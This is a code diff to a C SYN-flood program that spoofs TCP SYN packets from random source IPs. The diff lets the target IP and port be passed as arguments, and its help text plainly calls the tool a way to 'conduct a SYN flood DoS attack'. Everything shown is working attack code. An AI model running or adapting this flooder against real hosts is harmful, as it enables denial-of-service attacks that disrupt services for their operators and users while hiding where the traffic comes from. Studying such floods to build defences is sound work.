@@ -36,9 +36,17 @@ void send_raw_ip_packet(struct ipheader *ip)
 }
 
 // Spoof a TCP SYN packet.
-int main()
+int main(int argc, char ** argv)
 {
     char buffer[PACKET_LEN];
+
+    // "sanity check" of arguments + help message
+    if (argc != 3) {
+        printf("%s: conduct a SYN flood DoS attack (see https://github.com/adamalston/SYN-Flood/blob/master/README.md)\nARGUMENTS:\n\t%s TARGET_PORT TARGET_IP\n", argv[0], argv[0]);
+        return 0;
+    }
+    
+    char * dest_ip = argv[argc-1];
     struct ipheader *ip = (struct ipheader *)buffer;
     struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
 
@@ -61,7 +69,7 @@ int main()
         ip->iph_ihl = 5;					// Header length
         ip->iph_ttl = 50;					// Time to live
         ip->iph_sourceip.s_addr = rand();	// Use a random IP address
-        ip->iph_destip.s_addr = inet_addr(DEST_IP);
+        ip->iph_destip.s_addr = inet_addr(dest_ip);
         ip->iph_protocol = IPPROTO_TCP; 	// The value is 6.
         ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
 
